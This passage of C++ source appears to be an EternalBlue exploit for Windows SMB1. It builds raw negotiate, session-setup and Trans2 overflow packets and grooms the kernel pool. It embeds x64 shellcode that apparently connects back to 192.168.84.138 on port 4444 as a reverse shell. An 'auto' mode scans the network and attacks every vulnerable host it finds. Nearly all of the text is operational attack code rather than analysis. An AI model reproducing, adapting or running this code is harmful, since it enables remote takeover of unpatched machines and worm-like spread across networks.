        pkt.insert(pkt.end(), 4, 0x00);
        pkt.insert(pkt.end(), {0xf0, 0xf1, 0xdf, 0xff});
        pkt.insert(pkt.end(), 64, 0x00); 

        pkt.insert(pkt.end(), {0xf0, 0x01, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff});
        pkt.insert(pkt.end(), 8, 0x00);
        pkt.insert(pkt.end(), {0x00, 0x02, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff});
        pkt.insert(pkt.end(), 1, 0x00);

        pkt.insert(pkt.end(), kernel_user_payload.begin(), kernel_user_payload.end());

        int remaining = pkt_max_payload - kernel_user_payload.size();
        if (remaining > 0) {
            pkt.insert(pkt.end(), remaining, 0x00);
        }

        return pkt;
    }

    SOCKET Connect() {
       SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return INVALID_SOCKET;

        int buf_size = 8192;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)&buf_size, sizeof(buf_size));
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)&buf_size, sizeof(buf_size));
        
        int window_size = 64240;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)&window_size, sizeof(window_size));

        int tcp_timestamps = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&tcp_timestamps, sizeof(tcp_timestamps));

        int timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(445);
        inet_pton(AF_INET, targetIP.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            std::cout << "[-] Connect failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            return INVALID_SOCKET;
        }

        return sock;
    }

    void InitializePackets() {
        unsigned char negotiate[] = {
            0x00, 0x00, 0x00, 0x54, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0xA9,
            0x00, 0x00, 0x3C, 0xCC, 0x00, 0x31, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E,
            0x30, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54,
            0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E, 0x54, 0x20,
            0x4C, 0x4D, 0x20, 0x30, 0x3E, 0x31, 0x32, 0x00, 0x00
        };
        memcpy(smbNegotiate, negotiate, sizeof(negotiate));

        unsigned char setup[] = {
            0x00, 0x00, 0x00, 0x88, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x00, 0x40, 0x00, 0x0D, 0xFF, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x00, 0x4B,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00,
            0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00,
            0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00,
            0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00,
            0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00
        };
        memcpy(sessionSetup, setup, sizeof(setup));

        unsigned char treeConnect[] = {
            0x00, 0x00, 0x00, 0x60, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x08, 0x40, 0x00, 0x04, 0xFF, 0x00, 0x60, 0x00, 0x08, 0x00, 0x01, 0x00, 0x35, 0x00, 0x00,
            0x5C, 0x00, 0x5C, 0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x36, 0x00,
            0x38, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x37, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x32, 0x00,
            0x38, 0x00, 0x5C, 0x00, 0x49, 0x00, 0x50, 0x00, 0x43, 0x00, 0x24, 0x00, 0x00, 0x00, 0x3F, 0x3F,
            0x3F, 0x3F, 0x3F, 0x00
        };
        memcpy(treeConnectRequest, treeConnect, sizeof(treeConnect));

        unsigned char kernel_payload[] = {
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
            0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x51,
            0x48, 0x8b, 0x52, 0x18, 0x56, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7,
            0x4a, 0x4a, 0x48, 0x8b, 0x72, 0x50, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
            0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
            0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
            0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
            0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0x44, 0x8b,
            0x40, 0x20, 0x49, 0x01, 0xd0, 0x50, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
            0x8b, 0x34, 0x88, 0x4d, 0x31, 0xc9, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0,
            0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
            0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
            0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
            0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
            0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
            0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
            0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49,
            0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
            0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
            0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x54, 0x8a, 0x41, 0x54,
            0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
            0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
            0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50,
            0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
            0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf,
            0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89,
            0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
            0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00,
            0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9,
            0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
            0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20,
            0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00,
            0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4,
            0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31,
            0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba,
            0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58,
            0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00,
            0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41,
            0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c,
            0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6,
            0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d,
            0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff, 0xd5
        };
        memcpy(payload, kernel_payload, sizeof(kernel_payload));
    }

    bool SendNegotiate(SOCKET sock) {
        if (!Send(sock, smbNegotiate, sizeof(smbNegotiate))) return false;

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));

        if (len < 36) return false;
        return true;
    }

    bool DoSessionSetup(SOCKET sock) {
        if (!Send(sock, sessionSetup, sizeof(sessionSetup))) return false;

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));
        if (len < 36) {
            return false;
        }

        uint32_t status = *(uint32_t*)(resp + 9);
        if (status != 0) return false;

        userID[0] = resp[32];
        userID[1] = resp[33];
        
        return true;
    }

    bool SendTreeConnect(SOCKET sock) {
        treeConnectRequest[32] = userID[0];
        treeConnectRequest[33] = userID[1];

        // std::string targetPath = "\\\\" + targetIP + "\\IPC$";
        // size_t pathOffset = 56;
        
        // for (size_t i = 0; i < targetPath.length(); i++) {
        //     treeConnectRequest[pathOffset + (i * 2)] = targetPath[i];
        //     treeConnectRequest[pathOffset + (i * 2) + 1] = 0x00;
        // }

        if (!Send(sock, treeConnectRequest, sizeof(treeConnectRequest))) {
            return false;
        }

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));

        if (len < 36) return false;

        treeID[0] = resp[28];
        treeID[1] = resp[29];

        uint32_t status = *(uint32_t*)(resp + 9);
        if (status != 0) return false;

        return true;
    }

    std::vector<uint8_t> MakeSMB1NTTransPacket() {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header (32 bytes)
        packet.insert(packet.end(), {
            0xFF, 0x53, 0x4D, 0x42,                             // SMB signature
            0xA0,                                               // Command
            0x00, 0x00, 0x00, 0x00,                             // Status
            0x18,                                               // Flags
            0x07, 0xC0,                                         // Flags2
            0x00, 0x00,                                         // PID High
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // SecurityFeatures
            0x00, 0x00, 
            treeID[0], treeID[1],                               // Tree ID
            0xFF, 0xFE,                                         // Process ID
            userID[0], userID[1],                               // User ID
            0x40, 0x00,                                         // MID
        });
        
        // SMB Parameters
        packet.insert(packet.end(), {
            0x14,                           // WordCount
            0x01,                           // MaxSetupCount
            0x00, 0x00,                     // Reserved1
            0x1E, 0x00, 0x00, 0x00,         // TotalParameterCount
            0xD0, 0x03, 0x01, 0x00,         // TotalDataCount
            0x1E, 0x00, 0x00, 0x00,         // MaxParameterCount
            0x00, 0x00, 0x00, 0x00,         // MaxDataCount
            0x1E, 0x00, 0x00, 0x00,         // ParameterCount
            0x4B, 0x00, 0x00, 0x00,         // ParameterOffset
            0xD0, 0x03, 0x00, 0x00,         // DataCount
            0x68, 0x00, 0x00, 0x00,         // DataOffset
            0x01,                           // SetupCount
            0x00, 0x00,                     // Function
            0x00, 0x00,                     // Setup
        });
        
        // SMB Data
        packet.insert(packet.end(), {
            0xEC, 0x03,                     // Byte Count
            0x00,                           // Padding
        });
        
        packet.insert(packet.end(), 30, 0x00);
        packet.insert(packet.end(), {0x01});
        packet.insert(packet.end(), 973, 0x00);
        
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    std::vector<uint8_t> MakeSMB1Trans2ExploitPacket(ExploitType type, uint8_t timeout) {
        std::vector<uint8_t> pkt;
    
        // Calculate timeout value (timeout * 0x10 + 3)
        uint8_t calculated_timeout = (timeout * 0x10) + 3;
        
        // NetBIOS Session Service header (4 bytes)
        pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00}); // Placeholder for length
        
        // SMB Header (32 bytes)
        pkt.insert(pkt.end(), {
            0xFF, 'S', 'M', 'B',                         // SMB signature
            0x33,                                        // Command: SMB_COM_TRANSACTION2_SECONDARY (0x32)
            0x00, 0x00, 0x00, 0x00,                      // Status
            0x18,                                        // Flags
            0x07, 0xC0,                                  // Flags2
            0x00, 0x00,                                  // PID High
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SecurityFeatures
            0x00, 0x00, 
            treeID[0], treeID[1],                        // Tree ID
            0xFF, 0xFE,                                  // Process ID 
            userID[0], userID[1],                        // User ID
            0x40, 0x00,                                  // Multiplex ID
        });
        
        // SMB_Parameters
        pkt.insert(pkt.end(), {
            0x09,                                       // WordCount
        });
        
        pkt.insert(pkt.end(), {
            0x00, 0x00,                             // TotalParameterCount = 0
            0x00, 0x10,                             // TotalDataCount = 4096
            0x00, 0x00,                             // MaxParameterCount = 0
            0x00, 0x00,                             // MaxDataCount = 0
            0x00,                                   // MaxSetupCount = 0
            0x00,                                   // Reserved1
            0x00, 0x10,                             // Flags
            0x35, 0x00, 0xD0, calculated_timeout,   // Timeout
            0x00, 0x00,                             // Reserved2
        });
        
        // ParameterCount = 4096, ParameterOffset 
        pkt.insert(pkt.end(), {0x00, 0x10, 0x00, 0x00});
        // DataCount DataOffset
        pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00});
        // DataDisplacement 
        pkt.insert(pkt.end(), {0x00, 0x00});
        // SetupCount 
        pkt.insert(pkt.end(), {0x00});
        // ByteCount
        pkt.insert(pkt.end(), {0x00, 0x00});
        
        std::vector<uint8_t> data_section;
        
        switch (type) {
            case ExploitType::TRANS2_EXPLOIT: {
                data_section.insert(data_section.end(), 2957, 0x41);
                data_section.insert(data_section.end(), {0x80, 0x00, 0xA8, 0x00}); // overflow trigger
                data_section.insert(data_section.end(), 0x10, 0x00);  // 16 zeros
                data_section.insert(data_section.end(), {0xFF, 0xFF}); // 0xFFFF
                data_section.insert(data_section.end(), 0x6, 0x00);   // 6 zeros  
                data_section.insert(data_section.end(), {0xFF, 0xFF}); // 0xFFFF
                data_section.insert(data_section.end(), 0x16, 0x00);  // 22 zeros
                data_section.insert(data_section.end(), {0x00, 0xF1, 0xDF, 0xFF}); // x86 address 1
                data_section.insert(data_section.end(), 0x8, 0x00);   // 8 zeros
                data_section.insert(data_section.end(), {0x20, 0xF0, 0xDF, 0xFF}); // x86 address 2
                data_section.insert(data_section.end(), {0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address
                data_section.insert(data_section.end(), {0x60, 0x00, 0x04, 0x10}); // data
                data_section.insert(data_section.end(), 4, 0x00);     // 4 zeros
                data_section.insert(data_section.end(), {0x80, 0xEF, 0xDF, 0xFF}); // address
                data_section.insert(data_section.end(), 4, 0x00);     // 4 zeros
                data_section.insert(data_section.end(), {0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 2
                data_section.insert(data_section.end(), {0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 3
                data_section.insert(data_section.end(), 0x10, 0x00);  // 16 zeros
                data_section.insert(data_section.end(), {0x60, 0x00, 0x04, 0x10}); // data
                data_section.insert(data_section.end(), 0xC, 0x00);   // 12 zeros
                data_section.insert(data_section.end(), {0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 4
                data_section.insert(data_section.end(), 0x8, 0x00);   // 8 zeros
                data_section.insert(data_section.end(), {0x80, 0x10}); // data
                data_section.insert(data_section.end(), 0xE, 0x00);   // 14 zeros
                data_section.insert(data_section.end(), {0x39, 0xBB}); // magic bytes
                data_section.insert(data_section.end(), 965, 0x41);   // 965 bytes of 'A'
                break;
            }
            
            case ExploitType::TRANS2_ZERO: {
                data_section.insert(data_section.end(), 2055, 0x00);  
                data_section.insert(data_section.end(), {0x83, 0xF3}); 
                data_section.insert(data_section.end(), 2039, 0x41); 
                break;
            }
            
            case ExploitType::TRANS2_BUFFER: {
                data_section.insert(data_section.end(), 4096, 0x41); 
                break;
            }
        }
        
        pkt.insert(pkt.end(), data_section.begin(), data_section.end());
        
        // Update NetBIOS length
        uint32_t netbios_len = pkt.size() - 4;
        pkt[0] = 0x00;
        pkt[1] = 0x00;
        pkt[2] = (netbios_len >> 8) & 0xFF;
        pkt[3] = netbios_len & 0xFF;
        
        return pkt;
    }

    bool SendNTLargeBuffer(SOCKET sock) {
        auto nt_trans_pkt = MakeSMB1NTTransPacket();

        if (!Send(sock, nt_trans_pkt.data(), nt_trans_pkt.size())) {
            return false;
        }
        
        unsigned char resp[1024];
        Recv(sock, resp, sizeof(resp));
        
        std::vector<uint8_t> all_packets;
        
        auto trans2_zero_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_ZERO, 0);
        all_packets.insert(all_packets.end(), trans2_zero_pkt.begin(), trans2_zero_pkt.end());
        
        for (int i = 1; i < 15; i++) {
            auto groom_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_BUFFER, i);
            all_packets.insert(all_packets.end(), groom_pkt.begin(), groom_pkt.end());
        }

        if (!Send(sock, all_packets.data(), all_packets.size())) return false;
        return true;
    }

    std::vector<uint8_t> MakeSMB1FreeHoleSessionPacket(const std::vector<uint8_t>& flags2, const std::vector<uint8_t>& vcnum,const std::vector<uint8_t>& native_os) {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});

        // SMB Header (32 bytes)
        packet.insert(packet.end(), {
            0xFF, 0x53, 0x4D, 0x42,     // SMB signature
            0x73,                       // Command: SESSION_SETUP_ANDX
            0x00, 0x00, 0x00, 0x00,     // Status
            0x18,                       // Flags
            flags2[0], flags2[1],       // Flags2
            0x00, 0x00,                 // PID High
            0x00, 0x00, 0x00, 0x00,     // Security Features
            0x00, 0x00, 0x00, 0x00,     // Security Features
            0x00, 0x00,                 // Reserved
            0x00, 0x00,                 // TID
            0xFF, 0xFE,                 // PID  
            0x00, 0x00,                 // UID
            0x40, 0x00                  // MID
        });

        // Parameter Block
        packet.insert(packet.end(), {
            0x0C,                       // WordCount
            0xFF,                       // AndXCommand (no next command)
            0x00,                       // AndXReserved
            0x00, 0x00,                 // AndXOffset
            0x04, 0x11,                 // MaxBufferSize
            0x0A, 0x00,                 // MaxMpxCount
            vcnum[0], vcnum[1],         // VcNumber
            0x00, 0x00, 0x00, 0x00,     // SessionKey
            0x00, 0x00,                 // SecurityBlobLength
            0x00, 0x00, 0x00, 0x00,     // Reserved
            0x00, 0x00, 0x00, 0x80,     // Capabilities
        });
        
        size_t byte_count_offset = packet.size();
        packet.insert(packet.end(), {
            0x00, 0x00,                 // ByteCount
        });

        packet.insert(packet.end(), native_os.begin(), native_os.end());
        packet.insert(packet.end(), 15, 0x00); 

        packet.insert(packet.end(), {0x00, 0x00});
    
        uint16_t byte_count = packet.size() - byte_count_offset - 2;
        packet[byte_count_offset] = byte_count & 0xFF;
        packet[byte_count_offset + 1] = (byte_count >> 8) & 0xFF;
        
        // Update NetBIOS length
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    SOCKET Smb1FreeHole(bool start) {
        SOCKET sock = Connect();
        if (sock == INVALID_SOCKET) return INVALID_SOCKET;

        if (!SendNegotiate(sock)) { 
            closesocket(sock);
            return INVALID_SOCKET;
        }

        std::vector<uint8_t> pkt;
        if (start) {
            pkt = MakeSMB1FreeHoleSessionPacket(
                std::vector<uint8_t>{0x07, 0xC0},  // flags2
                std::vector<uint8_t>{0x2D, 0x01},  // vc_number  
                std::vector<uint8_t>{0xF0, 0xFF, 0x00, 0x00, 0x00}  // native_os
            );
        } else {
            pkt = MakeSMB1FreeHoleSessionPacket(
                std::vector<uint8_t>{0x07, 0x40},  // flags2
                std::vector<uint8_t>{0x2C, 0x01},  // vc_number
                std::vector<uint8_t>{0xF8, 0x87, 0x00, 0x00, 0x00}  // native_os
            );
        }

        if (!Send(sock, pkt.data(), pkt.size())) {
            closesocket(sock);
            return INVALID_SOCKET;
        }

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));
        if (len <= 0) {
            closesocket(sock);
            return INVALID_SOCKET;
        }

        return sock;
    }

    bool SMB2Grooming(int grooms, const std::vector<uint8_t>& payload_hdr_pkt) {
        groomSockets.clear();
        
        for (int i = 0; i < grooms; i++) {
            SOCKET groom_sock = Connect();
            if (groom_sock == INVALID_SOCKET) continue;
            
            if (!SendNegotiate(groom_sock)) {
                closesocket(groom_sock);
                continue;
            }
            
            if (!Send(groom_sock, payload_hdr_pkt.data(), payload_hdr_pkt.size())) {
                closesocket(groom_sock);
                continue;
            }
            
            groomSockets.push_back(groom_sock);
        }
        
        return !groomSockets.empty();
    }

};

class Attack {
public:
    static void LaunchAuto() {
        auto targets = NetworkRecon::Execute();
        if (targets.empty()) return;

        EternalBlue exploit;
        for (const auto& t : targets) {
            exploit.Exploit(t);
        }
    }

    static void LaunchSingle(const std::string& ip) {
        EternalBlue exploit;
        exploit.Exploit(ip);
    }
};

void ShowUsage(const char* programName) {
    std::cout << "Usage:\n";
    std::cout << "  " << programName << " auto                    - Scan and exploit all vulnerable hosts in network\n";
    std::cout << "  " << programName << " <IP_ADDRESS>            - Exploit specific IP address\n";
}

std::atomic<int> NetworkRecon::scanned_count(0);
std::atomic<int> NetworkRecon::target_count(0);

int main(int argc, char* argv[]) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    
    if (argc == 2) {
        std::string option = argv[1];
        
        if (option == "auto") 
            Attack::LaunchAuto();
        else 
            Attack::LaunchSingle(option);
    } 
    else ShowUsage(argv[0]);

    WSACleanup();
    return 0;
}